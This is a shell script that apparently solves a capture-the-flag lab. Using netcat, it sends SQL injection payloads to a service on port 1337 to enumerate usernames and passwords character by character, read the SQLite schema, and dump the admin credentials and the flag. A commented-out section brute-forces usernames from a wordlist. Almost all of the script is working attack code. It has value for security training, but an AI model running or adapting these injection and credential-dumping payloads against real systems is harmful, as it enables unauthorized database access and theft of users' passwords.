#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.96.170"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

search() {
    local beginning=$1
    output_file="$result_folder/temp.txt"
    for char in a b c d e f g h i j k l m n o p q r s t u v w x y z \
            A B C D E F G H I J K L M N O P Q R S T U V W X Y Z \
            0 1 2 3 4 5 6 7 8 9 \
            '!' '"' '#' '$' '&' '(' ')' '*' '+' ',' '-' '.' '/' \
            ':' ';' '<' '=' '>' '?' '@' '[' '\\' ']' '^' '_' '`' '{' '|' '}' '~' 
        do

        echo  "' or username LIKE '$beginning$char%" | nc $target_ip 1337 -q 1 > "$output_file"
        password=$(cat $output_file | sed -n 's/.*Password: \(.*\)/\1/p')
        if [[ -n "$password" ]]; then
            echo "---> Found user $beginning$char with password $password" >> $result_folder/light-users.txt
            search $beginning$char
        fi

    done
}

echo "1 - RECONNAISSANCE"
#nmap -p- -sC -sV -A -sS -T4 ${target_ip} > $result_folder/nmap-results.txt

echo "2 - INTRUSION"
# Brute force attack on user names
# echo "Light users search :" > $result_folder/light-users.txt
# while IFS= read -r username; do
#    
#    user=$(echo $username | tr -d '\n' | tr -d '\r\n')
#    # Define the output file
#    output_file="$result_folder/temp.txt"
#
#    # Send the username via nc and save the output
#    echo "$user" | nc "$target_ip" "1337" -q 2 > "$output_file"
#    password=$(cat $output_file | sed -n 's/.*Password: \(.*\)/\1/p')
#    if [[ -n "$password" ]]; then
#        echo "---> Found user $user with password $password" >> $result_folder/light-users.txt
#    fi
#done < "/usr/share/seclists/Usernames/Names/names.txt"
#search ""


# Gather information on backend database
echo "' Union Select sqlite_version() '" | nc $target_ip 1337 -q 1 > $result_folder/sqlite_version.txt
version=$(cat $result_folder/sqlite_version.txt | sed -n 's/.*Password: \(.*\)/\1/p')
echo "---> SQLITE database version is $version"

# Retrieve information on databases 
# The sqlite_master table has the following columns:
# Column	Type	Description
# type	    TEXT	The type of database object (table, index, view, or trigger).
# name	    TEXT	The name of the object (e.g., table name).
# tbl_name	TEXT	The table associated with the object (for indexes, triggers, etc.).
# rootpage	INTEGER	The root page number of the object in the database file.
# sql	    TEXT	The SQL statement used to create the object.

#rm -f $result_folder/tables.txt 2> /dev/null
#touch $result_folder/tables.txt
#for char in a b c d e f g h i j k l m n o p q r s t u v w x y z 
#do
#    echo "' Union Select name from sqlite_master where name LIKE '$char%" | nc $target_ip 1337 -q 1 > "$result_folder/temp.txt"
#    table=$(cat $result_folder/temp.txt | sed -n 's/.*Password: \(.*\)/\1/p')
#    if [[ -n "$table" ]]; then
#        echo "$table" >> $result_folder/tables.txt
#    fi
#done
echo "---> SQLITE database contains tables : $(paste -sd ", " $result_folder/tables.txt)"

# Deep dive into admin table
ADMINTABLE=$(cat $result_folder/tables.txt | grep admin)
echo "' Union Select Username from $ADMINTABLE '" | nc $target_ip 1337 -q 1 > "$result_folder/temp.txt"
ADMINUSER=$(cat $result_folder/temp.txt | sed -n 's/.*Password: \(.*\)/\1/p')
echo "---> Admin username is : $ADMINUSER"
echo "' Union Select Password from $ADMINTABLE where username = '$ADMINUSER" | nc $target_ip 1337 -q 1 > "$result_folder/temp.txt"
ADMINPASSWORD=$(cat $result_folder/temp.txt | sed -n 's/.*Password: \(.*\)/\1/p')
echo "---> Admin password is : $ADMINPASSWORD"
echo "' Union Select Password from $ADMINTABLE '" | nc $target_ip 1337 -q 1 > "$result_folder/temp.txt"
FLAG=$(cat $result_folder/temp.txt | sed -n 's/.*Password: \(.*\)/\1/p')
echo "---> Flag is : $FLAG"

